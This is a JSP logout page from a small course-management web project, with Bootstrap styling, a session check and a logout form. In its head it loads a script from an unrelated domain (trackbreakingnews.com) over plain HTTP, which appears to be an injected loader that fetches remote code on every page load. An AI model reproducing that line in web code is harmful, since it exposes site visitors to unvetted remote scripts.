
<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">


  <head>
  <style>
  .FFF {
  position: relative;
  top:585px;
  }
  
  .CCCxx{
  position: relative;
  left:350px;
  top:220px;
  }
   .CCCxx strong{
	color:#fff;
	font-family:Lato;
	font-weight:bold;
	position:relative;
	top:7px;
	font-size:32px;
	margin: 40px;
  }
      body{

	background-image:url("iWall/lol - Copy.jpg");
	background-size:cover;
}
body:before {
    content: " ";
    width: 100%;
    height:710px;;
    position: absolute;
    z-index: -1;
    top: 0;
    left: 0;
    background: -moz-radial-gradient(top center, ellipse cover, rgba(155,200,255,0.2) 0%,rgba(0,0,0,0.5) 100%);
	background: -webkit-radial-gradient(top center, ellipse cover, rgba(155,200,255,0.2) 0%,rgba(0,0,0,0.5) 100%);
 	background: radial-gradient(top center, ellipse cover, rgba(155,200,255,0.2) 0%,rgba(0,0,0,0.5) 100%);
 	background: -ms-radial-gradient(top center, ellipse cover, rgba(155,200,255,0.2) 0%,rgba(0,0,0,0.5) 100%);

}
  </style>
  	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  	<script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Logout User</title>

    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <link href="CSS/Style.css" rel="stylesheet">
    <link href="CSS/Stylez.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]>
    <script src="js/ie8-responsive-file-warning.js"></script>
    <![endif]-->
    <script src="js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="js/wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>
  <body>
  	<%
  	String user=(String) session.getAttribute("xuser");
  	if(user==null){
  		request.setAttribute("Error","You Must Login First...");
  		RequestDispatcher rd=request.getRequestDispatcher("UserLogin1.jsp");
  		rd.forward(request,response);	
  	}
  	%>
				
				<div class="navbar navbar-inverse navbar-fixed-top">
					<div class="container">
						<a class="navbar-brand XX" href="Data1.jsp">
							<img src="iWall/logo1.png"><p>CMS</p>
						</a>
						<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						</button>
						<div class="collapse navbar-collapse">
					<ul class="nav navbar-nav pull-right">
					<li> <a href="Home2.jsp">Home</a></li>
					<li> <a href="Course.jsp">Course</a></li>
					
					
					 <%
						 session=request.getSession();
                   		String ss1=(String) session.getAttribute("xuser");
                   		String ss2=(String) session.getAttribute("xmail");
                   		String ss3=(String) session.getAttribute("xguest");
						if(ss1==null && ss2==null && ss3==null){
                     %>
                     
					<li> <a href="Login1.jsp">Login</a></li>
					<%}
						else if(ss2==null && ss1!=null || ss3!=null){%>
						
					<li class="dropdown">
						<a href="#" data-toggle="dropdown" class="dropdown-toggle">More <span class="caret"></span></a>
						<ul class="dropdown-menu">
				
						<li class="divider"></li>
						<li><a href="#">Setting</a> </li>
						<li class="divider"></li>
						<li> <a href="Logout2.jsp">Logout</a> </li>
						
						<%} %>
						
						
                   <%
						 session=request.getSession();
                   		String ss=(String) session.getAttribute("xuser");
						if(ss!=null){
                     %>
					
					<%
						}
					%>
					</ul>
	          </div> 
	      </div>
	  </div>

<div class="row"> 

		 <div class="container CCCxx">
 <form action="LoginForm1.jsp" method="post">
 <strong class="lead">Are You Sure ? you Want To ?</strong>
 <button type="submit" class="btn btn-danger btn-lg" name="lgx" id="lgx"  value="Logout" > Logout
 </button>
  <button type="submit" class="btn btn-default btn-lg" name="lgx1" id="lgx1"  value="Logout" >Close
 </button>
 </form>
 </div>
				<div class="Cvv">
						<div class="container-fluid FFF">
							<div class="row">
						<div class="col-lg-12  FF">
							<h5>
							@2015 All Rights Reserved / Legal Notices / Privacy Policy  <small>Ajay Singh Bisht | 2015 | @002ajay (</em>Twitter</em>)</small>
							</h5>
						</div>
					</div>
				</div>


			  <script src="jquery.min.js"></script>
			    <script src="js/bootstrap.min.js"></script>
			    <script src="js/docs.min.js"></script>
			    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
			    <script src="js/ie10-viewport-bug-workaround.js"></script>
			    <script>
				$('.dropdown').hover(function() {
					$('.dropdown-toggle',this).trigger('click');
				});
				</script>
			  </body>
			</html>

